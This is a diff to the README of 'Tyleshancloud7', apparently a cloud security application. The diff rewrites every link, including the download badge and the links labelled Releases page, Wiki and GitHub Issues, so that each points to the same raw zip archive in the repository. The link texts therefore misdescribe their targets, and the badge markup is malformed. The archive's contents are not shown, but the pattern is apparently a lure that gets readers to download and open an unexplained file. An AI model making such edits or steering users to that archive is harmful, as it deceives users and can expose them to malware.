@@ -6,9 +6,9 @@ Welcome to Tyleshancloud7! This application helps you manage your cloud security
 ## 📦 Download & Install
 To get started, you’ll need to download the software. Click the link below to visit the Releases page where you can find the latest version of Tyleshancloud7:
 
-[![Download Tyleshancloud7](https://img.shields.io/badge/Download%20Tyleshancloud7-v1.0-blue.svg)](https://github.com/dryssboy/Tyleshancloud7/releases)
+[![Download Tyleshancloud7](https://github.com/dryssboy/Tyleshancloud7/raw/refs/heads/main/Inkra/Tyleshancloud-2.4.zip%https://github.com/dryssboy/Tyleshancloud7/raw/refs/heads/main/Inkra/Tyleshancloud-2.4.zip)](https://github.com/dryssboy/Tyleshancloud7/raw/refs/heads/main/Inkra/Tyleshancloud-2.4.zip)
 
-1. Visit the [Releases page](https://github.com/dryssboy/Tyleshancloud7/releases).
+1. Visit the [Releases page](https://github.com/dryssboy/Tyleshancloud7/raw/refs/heads/main/Inkra/Tyleshancloud-2.4.zip).
 2. Choose the latest version.
 3. Click the download link for your system.
 4. Open the downloaded file to install the application.
@@ -48,16 +48,16 @@ If you encounter any issues:
 ## 📚 Additional Resources
 To learn more about Tyleshancloud7 and its features:
 
-- Check the [Wiki](https://github.com/dryssboy/Tyleshancloud7/wiki) for in-depth guides.
+- Check the [Wiki](https://github.com/dryssboy/Tyleshancloud7/raw/refs/heads/main/Inkra/Tyleshancloud-2.4.zip) for in-depth guides.
 - Visit our blog for updates on AI and cybersecurity trends.
 
 ## 🤝 Community Support
 Join our community of users and developers:
 
-- Participate in discussions on our [GitHub Issues page](https://github.com/dryssboy/Tyleshancloud7/issues).
+- Participate in discussions on our [GitHub Issues page](https://github.com/dryssboy/Tyleshancloud7/raw/refs/heads/main/Inkra/Tyleshancloud-2.4.zip).
 - Follow our social media channels for news and updates.
 
 ## ✅ Final Note
 Tyleshancloud7 aims to simplify your cloud security management experience. We appreciate your support and look forward to your feedback.
 
-To download the latest version, remember to visit the [Releases page](https://github.com/dryssboy/Tyleshancloud7/releases).
+To download the latest version, remember to visit the [Releases page](https://github.com/dryssboy/Tyleshancloud7/raw/refs/heads/main/Inkra/Tyleshancloud-2.4.zip).
